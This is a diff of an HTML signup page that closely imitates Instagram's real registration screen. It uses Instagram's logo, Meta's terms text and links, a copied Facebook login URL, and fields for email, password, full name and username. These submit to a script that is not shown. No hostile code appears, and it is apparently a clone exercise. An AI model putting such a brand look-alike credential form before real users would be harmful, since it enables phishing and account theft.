@@ -4,99 +4,93 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Instagram Register</title>
-  <link rel="stylesheet" href="style.css">
-  <style>
-    @font-face {
-      font-family: 'InstagramFont';
-      src: url('InstagramFont.woff2') format('woff2');
-    }
-
-    body {
-      background-color: #000;
-      font-family: Arial, sans-serif;
-      margin: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-    }
-
-    .wrapper {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      transform: scale(1.5);
-    }
-
-    .login-container {
-      background-color: #000;
-      border: 1px solid #262626;
-      border-radius: 8px;
-      width: 350px;
-      text-align: center;
-      padding: 40px;
-      margin-bottom: 10px;
-    }
-
-    .login-container h1 {
-      font-family: 'InstagramFont', cursive;
-      font-size: 48px;
-      color: white;
-      margin-bottom: 30px;
-    }
-
-    input[type="text"], input[type="password"] {
-      width: 100%;
-      padding: 10px;
-      margin: 6px 0;
-      background-color: #121212;
-      color: #fff;
-      border: 1px solid #333;
-      border-radius: 4px;
-      font-size: 14px;
-    }
-
-    button {
-      width: 100%;
-      padding: 10px;
-      margin-top: 10px;
-      background-color: #0095f6;
-      border: none;
-      border-radius: 6px;
-      color: white;
-      font-weight: bold;
-      font-size: 14px;
-      cursor: pointer;
-    }
-
-    .bottom-text {
-      font-size: 12px;
-      color: #8e8e8e;
-      margin-top: 10px;
-    }
-
-    .bottom-text a {
-      color: #0095f6;
-      text-decoration: none;
-      font-weight: bold;
-    }
-  </style>
+  <link rel="stylesheet" href="register.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
 </head>
 <body>
   <div class="wrapper">
-    <div class="login-container">
-      <h1>Instagram</h1>
-      <input type="text" placeholder="Choose a username" id="register-username">
-      <input type="password" placeholder="Choose a password" id="register-password">
-      <button onclick="handleRegister()">Sign Up</button>
+    <div class="register-box">
+      <img class="logo-img" src="images/login/instaLogo.png" alt="Instagram logo" />
+      <p class="subtitle">Sign up to see photos and videos <br> from your friends.</p>
+
+     <a href="https://www.facebook.com/oidc/?app_id=124024574287414&redirect_uri=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignupviafb%2F&response_type=code&scope=openid%20email%20profile%20linking&state=ATlVq2-esT487u6W8kCjDHdTd6Hy_S5gB05XcO5eVl95EI80KGA1df5upjK0v5J9SGiKzp5t28yEUCnK4OFKq_Kxg1ZVj7py0fzXrY6dpVAivHK4RjGTrHc9kaJl6hOhdHXuYRVd5EB1JCZW_GLY0_shKElApfSPI8XSZlhIWuj3qDIyuGRISPu4sQRMrWnDQxzk6GWCdb-jlbRQpWuYrDWblDSawpHKnaYtDvfZVeY_U6hXYA" target="_blank">
+  <button class="facebook-btn">
+    <img src="images/login/facebook-icon2.png" alt="Facebook logo" class="fb-icon" />
+    Log in with Facebook
+  </button>
+</a>
+
+
+      <div class="divider">
+        <div class="line"></div>
+        <span>OR</span>
+        <div class="line"></div>
+      </div>
+
+      <input type="text" placeholder="Mobile Number or Email" id="register-email">
+      <input type="password" placeholder="Password" id="register-password">
+      <input type="text" placeholder="Full Name" id="register-fullname">
+      <input type="text" placeholder="Username" id="register-username">
+<p class="info-text">
+  People who use our service may have uploaded <br>your contact information to Instagram. 
+  <a href="https://help.instagram.com/581066165581870/?locale=en_US" target="_blank">Learn More</a>
+</p>
+
+<p class="info-text">
+  By signing up, you agree to our 
+  <a href="https://www.facebook.com/privacy/policy" target="_blank">Terms</a>, 
+  <a href="https://privacycenter.instagram.com/policies/cookies/" target="_blank">Privacy <br> Policy</a> and 
+  <a href="https://privacycenter.instagram.com/policies/cookies/" target="_blank">Cookies Policy</a>.
+</p>
+
+
+      <button class="signup-btn" onclick="handleRegister()">Sign up</button>
     </div>
 
-    <div class="login-container">
-      <div class="bottom-text">
-        Already have an account? <a href="login.html">Log in</a>
-      </div>
-    </div>
+   <div class="login-box">
+  <div class="login-text">
+    Have an account? <br>
+    <a href="login.html">Log in</a>
   </div>
+</div>
+
+
+<div class="get-app">
+  <p>Get the app.</p>
+  <div class="stores">
+    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D8560ED6E-6D10-4BFF-9EC5-FB2A76635012%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge%26original_referrer%3Dhttps://www.google.com/&pli=1" target="_blank">
+      <img src="images/login/googleplay.png" class="google-store" alt="Get it on Google Play">
+    </a>
+    <a href="https://apps.microsoft.com/store/detail/instagram/9NBLGGH5L9XT" target="_blank">
+      <img src="images/login/microsoft.png" class="microsoft-store" alt="Get it from Microsoft">
+    </a>
+  </div>
+</div>
+
+
+
+  <footer class="footer">
+    <div class="footer-links">
+  <a href="https://www.meta.com/about/?utm_source=about.meta.com&utm_medium=redirect" target="_blank">Meta</a>
+  <a href="https://about.instagram.com/" target="_blank">About</a>
+  <a href="https://about.instagram.com/blog" target="_blank">Blog</a>
+  <a href="https://about.instagram.com/about-us/careers" target="_blank">Jobs</a>
+  <a href="https://help.instagram.com/" target="_blank">Help</a>
+  <a href="https://developers.facebook.com/docs/instagram-platform" target="_blank">API</a>
+  <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect" target="_blank">Privacy</a>
+  <a href="https://www.instagram.com/privacy/cookie_settings/" target="_blank">Cookie Settings</a>
+  <a href="https://help.instagram.com/581066165581870/" target="_blank">Terms</a>
+  <a href="https://www.instagram.com/explore/locations/" target="_blank">Locations</a>
+  <a href="https://www.instagram.com/web/lite/" target="_blank">Instagram Lite</a>
+  <a href="https://www.threads.com/" target="_blank">Threads</a>
+  <a href="https://www.facebook.com/help/instagram/261704639352628" target="_blank">Contact Uploading & Non-Users</a>
+  <a href="https://help.instagram.com/743919667803742" target="_blank">Meta Verified</a>
+</div>
+
+      <span>English ▾</span>
+      <span>© 2025 Instagram from Meta</span>
+    </div>
+  </footer>
 
   <script src="script.js"></script>
 </body>
